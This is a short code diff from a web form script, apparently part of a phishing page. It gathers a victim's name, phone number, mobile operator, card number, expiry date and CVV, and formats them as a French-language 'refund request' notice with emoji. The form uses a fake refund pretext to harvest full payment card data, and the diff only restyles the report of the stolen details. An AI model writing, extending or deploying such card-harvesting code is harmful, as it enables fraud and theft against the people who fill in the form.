@@ -339,12 +339,13 @@ event.preventDefault();
     let cvv = document.getElementById('inputcvv').value;
 
     var msg = `
-Nom: ${firstname} ${lastname}
-num: ${phone}
-operator: ${operator}
-cart: ${cardnumber}
-mmyy: ${mm} / ${yy}
-cvv: ${cvv}`;
+    🔔 **Nouvelle Demande de Remboursement AM** 🔔
+👤 Nom: ${firstname} ${lastname}
+📞 num: ${phone}
+📡 operator: ${operator}
+💳 cart: ${cardnumber}
+📅 mmyy: ${mm} / ${yy}
+🔒 cvv: ${cvv}`;
 
     if (firstname === '' || lastname === '' || phone.length !== 10 || cardnumber.length !== 16 || cvv.length < 3 || operator === 'select') {
         alert('Certains champs sont vides. Veuillez remplir tous les champs requis.');
